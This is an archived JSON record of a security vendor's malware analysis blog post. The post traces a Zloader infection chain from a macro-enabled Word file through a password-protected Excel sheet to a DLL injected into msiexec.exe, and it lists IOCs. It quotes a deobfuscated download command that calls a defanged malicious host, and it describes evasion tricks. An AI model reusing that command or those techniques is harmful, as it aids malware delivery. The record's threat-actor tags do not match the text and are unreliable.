{
    "id": "ae1c54dd-a844-42b8-99a1-a9c67eba7e56",
    "created_at": "2023-01-12T15:02:25.141565Z",
    "updated_at": "2025-03-27T02:05:34.780543Z",
    "deleted_at": null,
    "sha1_hash": "5e131a17a540feca40d3c70564ef6f9ce221313e",
    "title": "2021-03-23 - Zloader- Entailing Different Office Files",
    "authors": "",
    "file_creation_date": "2022-05-28T17:56:12Z",
    "file_modification_date": "2022-05-28T17:56:12Z",
    "file_size": 2344413,
    "plain_text": "# Zloader: Entailing Different Office Files\n\n**blogs.quickheal.com/zloader-entailing-different-office-files/**\n\nMarch 23, 2021\n\nZloader aka Terdot – a variant of the infamous Zeus banking malware is well known for aggressively using\n“.xls”, “.xlsx” documents as its initial vector to deliver its payload. Despite this, recently we have come across\n“.docm” file which is being used by Zoader family to perform its initial activity. This shows adversaries like to\nexperiment with office documents to avoid being detected by security solutions.\n\n_Fig.1-Attack Chain_\n\n**Initial Vector:**\n\nHere infection chain starts with “.docm” file. Docm stands for “Macro-enabled office word document”. We\ncan see below, the document view asking user to enable content.\n\n\n-----\n\n_Fig.2- Document View_\n\nLike many other documents, we tried to observe its activity after enabling content but there was no activity in\nit. By looking at its VBA code, we got our answer. Enabling content will not do execution of macro. Here\nmacro execution starts on “Document close” as shown.\n\n_Fig.3- Macro Function Call_\n\nAs soon as victim close this document, function “nnn” gets called which is the main function of this VBA\nmacro. In this, again sub functions are being called. Here adversaries also make use of “Userform” to\nperform next stage activity.\n\n\n-----\n\n_Fig.4- Sub Function Call_\n\nUserForm_Initialize() function is used to invoke “Userform2”. Below image shows the userform2 object. In its\ndialog box, url data is chunked and overlapped on 25th ComboBox to hide actual data as shown below.\n\n_Fig.5- Hidden URL Data_\n\nAfter going through all ComboBox of userform2, we were able to locate malicious url which is used to\ndownload 2nd stage payload.\n\n\n-----\n\n_Fig.6- Chunked URL Data_\n\nTo sum up above activity, adversaries are making use of for loop to access all these values and create final\nurl as shown below,\n\n_Fig.7- Creation of URL on Document Close_\n\nSite “hxxps[:]//feelingfit-always[.]com/1[.]php” which is malicious having score 11 on virus total, is used to\ndownload password protected XLS file. Its password is hidden again in VBA macro in “Userform1”. By\nexploring userform1 data, we were able to extract hidden password.\n\n_Fig.8- Macro Code to protect XLS with password_\n\n\n-----\n\n_Fig.9- XLS Hidden Password_\n\n**2nd Stage Payload:**\n\nProtecting document with password is classic technique to defend against AV vendors. Correct password is\nnecessary to dig further into analysis. After matching above password, we can finally see excel workbook\ncontent. XLM macro is used in “Sheet3” to perform further activity.\n\n_Fig.10- XLS Workbook_\n\nHere code is embedded in different cells of document. Below figure shows the extracted macro code from\nabove  workbook:\n\n\n-----\n\n_Fig.11- XLM Macro Code_\n\nHere adversaries make use of excel inbuilt functions like IIF and Switch to obfuscate data. Final deobfuscated code can be seen as below,\n\n_WinHttp.WinHttpRequest.5.1.open GET https[:]//santarosafuneralhome[.]com/2.php False_\n\n_WinHttp.WinHttpRequest.5.1.SetRequestHeader_\n\n_WinHttp.WinHttpRequest.5.1.send_\n\nAbove malicious url having virus total score 8 is used to download 3rd stage payload of this attack.\n\n**Final Payload Analysis:**\n\nThe DLL is the final payload of Zloader. Here the DLL is highly obfuscated and avoids direct calls to the\nWindows APIs. Hashing is used to calculate the addresses and makes the call with the calculated values,\nmaking the reversing difficult.\n\n\n-----\n\nFig.12 – Code for address calculation\n\nThe DLL creates process ‘msiexec.exe’, which is a genuine Microsoft process that belongs to Windows\nComponent installer, in suspended mode and injects encrypted file to it.\n\n_Fig.13- ‘msiexec.exe’ created in suspended mode_\n\n_Fig.14- Encrypted file injected in ‘msiexec.exe’_\n\nIt also injects a routine that will decrypt and bring the malicious PE out for execution\n\n\n-----\n\n_Fig.15- Decryption Routine_\n\nWith the setting of thread context, the initial execution point is passed and finally the injected code is\nexecuted with resume thread.\n\nWhen this thread of msiexec.exe comes into execution, it tries to make connection to its CnC servers as shown,\n\nSince these urls were down at the time of analysis, we were not able to go further deeper into it.\n\n**Conclusion:**\n\nThis type of attack shows how adversaries innovate their mechanism to start infection chain to compromise\nvictim. User should always be cautious while opening any office files. Quick Heal and Seqrite enterprise\nsecurity solutions protect its customers from such files. So, remember to keep the endpoint security\nsolutions always updated.\n\n**IOCs:**\n\nDOCM: 117fafb46f27238351f2111e8f01416412044238d2f8378a285063eb9d4eef3d\n\n409ed829f19024045d26cc5d3a06e15a097605e13ba938875eca054a7a4a30b1\n\n91aa050536d834947709776af40c2fde49471d28231de50df0d324cd55101df4\n\nXLS:  52d071922413a3be8815a76118a45bf13d8d323b73ba42377591fd68c59dfc89\n\nURL:\n\nhttps[://]tiodeitidampheater.tk/post.php\n\nhttps[://]actes-etatcivil.com/post.php\n\n\n-----\n\nhttps[://]ankarakreatif.com/post.php\n\nhttps[://]www.ramazanyildiz.net/post.php\n\nhttps[://]hispaniaeng.com/post.php\n\nhttps[://]www.ifdd.francophonie.org/post.php\n\n**Subject Matter Expert:**\n\nAnjali Raut\n\nPriyanka Shinde\n\n**Anjali Raut**\n\n[Follow @AnjaliR51806529](https://twitter.com/AnjaliR51806529)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-23 - Zloader- Entailing Different Office Files.pdf"
    ],
    "report_names": [
        "2021-03-23 - Zloader- Entailing Different Office Files.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d1f8bd4e-bcd4-4101-9158-6158f1806b38",
            "created_at": "2023-01-06T13:46:39.487358Z",
            "updated_at": "2025-03-27T02:00:03.107568Z",
            "deleted_at": null,
            "main_name": "BazarCall",
            "aliases": [
                "BazaCall",
                "BazzarCall"
            ],
            "source_name": "MISPGALAXY:BazarCall",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535745,
    "ts_updated_at": 1743041134,
    "ts_creation_date": 1653760572,
    "ts_modification_date": 1653760572,
    "files": {
        "pdf": "https://archive.orkl.eu/5e131a17a540feca40d3c70564ef6f9ce221313e.pdf",
        "text": "https://archive.orkl.eu/5e131a17a540feca40d3c70564ef6f9ce221313e.txt",
        "img": "https://archive.orkl.eu/5e131a17a540feca40d3c70564ef6f9ce221313e.jpg"
    }
}